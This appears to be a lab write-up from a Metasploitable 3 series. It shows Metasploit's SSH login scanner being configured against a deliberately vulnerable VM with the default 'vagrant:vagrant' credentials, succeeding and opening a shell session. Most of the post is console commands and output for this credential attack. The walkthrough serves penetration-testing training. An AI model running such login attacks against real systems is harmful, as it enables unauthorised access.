---
title: Port 22 / SSH Login Check Scanner
description: Port 22 / SSH Login Check Scanner
date: 2024-01-18 00:00:00+0000
tags: 
    - Metasploitable3 Linux Edition
    - metasploit
    - SSH
categories:
    - Metasploitable3 Linux Edition
    - Parrot OS
toc: false
---

## Target: Metasploitable 3 Linux

## Tool: Metasploit

## Vulnerability: ssh logins

Port 22 / SSH Login Check Scanner

"This module will test ssh logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access."

<https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/>

```shell
[msf](Jobs:0 Agents:0) >> search auxiliary/scanner/ssh/ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey

[msf](Jobs:0 Agents:0) >> use 0
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted: none, user, user
                                                &realm)
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usi
                                                ng-metasploit.html
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set RHOST 10.0.2.28
RHOST => 10.0.2.28
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set USERNAME vagrant
USERNAME => vagrant
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> set PASSWORD vagrant
PASSWORD => vagrant
[msf](Jobs:0 Agents:0) auxiliary(scanner/ssh/ssh_login) >> exploit

[*] 10.0.2.28:22 - Starting bruteforce
[+] 10.0.2.28:22 - Success: 'vagrant:vagrant' 'uid=900(vagrant) gid=900(vagrant) groups=900(vagrant),27(sudo) Linux metasploitable3-ub1404 3.13.0-170-generic #220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (10.0.2.16:44067 -> 10.0.2.28:22) at 2024-02-20 13:01:21 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:1) auxiliary(scanner/ssh/ssh_login) >> sessions -i

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH root @   10.0.2.16:44067 -> 10.0.2.28:22 (10.0.2.28)

[msf](Jobs:0 Agents:1) auxiliary(scanner/ssh/ssh_login) >> 

```
